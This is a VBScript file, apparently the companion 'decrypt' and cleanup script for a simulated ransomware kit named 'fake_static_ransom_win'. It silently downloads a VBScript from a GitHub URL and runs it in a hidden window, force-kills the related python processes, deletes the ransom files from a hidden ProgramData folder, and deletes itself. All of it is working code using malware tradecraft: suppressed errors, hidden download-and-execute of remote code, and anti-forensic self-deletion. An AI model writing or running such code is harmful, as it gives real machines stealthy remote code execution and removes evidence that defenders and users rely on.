' Suppress all error popups
On Error Resume Next

Dim objShell, fso, tempDir, lalaPath, lalaUrl

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If objShell Is Nothing Or fso Is Nothing Then WScript.Quit

' Use Windows temp directory
tempDir = objShell.ExpandEnvironmentStrings("%WINDIR%") & "\Temp"
lalaPath = tempDir & "\encrypt.vbs"

' URL for encrypt.vbs (change if needed)
lalaUrl = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/encrypt.vbs"

' 1. Download encrypt.vbs
objShell.Run "cmd /c curl -sL -o """ & lalaPath & """ """ & lalaUrl & """", 0, True

' 2. Execute encrypt.vbs with --deec argument (hidden, wait for completion)
objShell.Run "cmd /c cd /d """ & tempDir & """ && cscript //nologo encrypt.vbs --decrypt", 0, True

' 3. Permanently delete encrypt.vbs
If fso.FileExists(lalaPath) Then fso.DeleteFile lalaPath, True

' =========================================================
' SPECIFIC BLOCK: KILL PYTHON PROCESSES & DELETE FILES
' =========================================================
Sub CleanRansomProcessesAndFiles()
    Dim objFSO, objShell, file1_py, file1_pyw, file2_py, file2_pyw
    Dim filesExist, psCmd1, psCmd2
    
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = CreateObject("WScript.Shell")
    
    ' Define all possible file variations
    file1_py = "C:\ProgramData\.config\_vb_launch_fake_static_ransom_win.py"
    file1_pyw = "C:\ProgramData\.config\_vb_launch_fake_static_ransom_win.pyw"
    file2_py = "C:\ProgramData\.config\fake_static_ransom_win.py"
    file2_pyw = "C:\ProgramData\.config\fake_static_ransom_win.pyw"
    
    ' Check if ANY of the files exist
    filesExist = False
    If objFSO.FileExists(file1_py) Then filesExist = True
    If objFSO.FileExists(file1_pyw) Then filesExist = True
    If objFSO.FileExists(file2_py) Then filesExist = True
    If objFSO.FileExists(file2_pyw) Then filesExist = True
    
    ' Your exact PowerShell commands (properly escaped for VBScript)
    psCmd1 = "powershell -Command ""Get-CimInstance Win32_Process -Filter \""name = 'python.exe'\"" | Where-Object {$_.CommandLine -like '*fake_static_ransom_win.py*'} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"""
    psCmd2 = "powershell -Command ""Get-CimInstance Win32_Process -Filter \""name = 'pythonw.exe'\"" | Where-Object {$_.CommandLine -like '*fake_static_ransom_win.pyw*'} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"""
    
    psCmd3 = "powershell -Command ""Get-CimInstance Win32_Process -Filter \""name = 'pythonw.exe'\"" | Where-Object {$_.CommandLine -like '*_vb_launch_fake_static_ransom_win.py*'} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"""
    psCmd4 = "powershell -Command ""Get-CimInstance Win32_Process -Filter \""name = 'pythonw.exe'\"" | Where-Object {$_.CommandLine -like '*_vb_launch_fake_static_ransom_win.pyw*'} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"""
    
    ' Suppress errors so if one command fails, it moves to the next without crashing
    On Error Resume Next
    
    ' Run PS1 (0 = hidden window, True = wait for it to finish)
    objShell.Run psCmd1, 0, True
    Err.Clear ' Clear any error so it doesn't affect the next step
    
    ' Run PS2
    objShell.Run psCmd2, 0, True
    Err.Clear 

    objShell.Run psCmd3, 0, True
    Err.Clear 

    objShell.Run psCmd4, 0, True
    Err.Clear 
    
    ' Permanently delete files ONLY if they existed in the first place
    If filesExist Then
        If objFSO.FileExists(file1_py) Then objFSO.DeleteFile file1_py, True
        If objFSO.FileExists(file1_pyw) Then objFSO.DeleteFile file1_pyw, True
        If objFSO.FileExists(file2_py) Then objFSO.DeleteFile file2_py, True
        If objFSO.FileExists(file2_pyw) Then objFSO.DeleteFile file2_pyw, True
    End If
    
    ' Restore standard error handling
    On Error GoTo 0
    
    ' Cleanup objects created by this Sub
    Set objFSO = Nothing
    Set objShell = Nothing
End Sub
' =========================================================

' >>> THIS IS THE MISSING LINE THAT CALLS THE FUNCTION <<<
CleanRansomProcessesAndFiles

' 4. Permanently delete this script itself (delayed to avoid file lock)
objShell.Run "cmd /c timeout /t 2 /nobreak >nul & del /f /q """ & WScript.ScriptFullName & """", 0, False
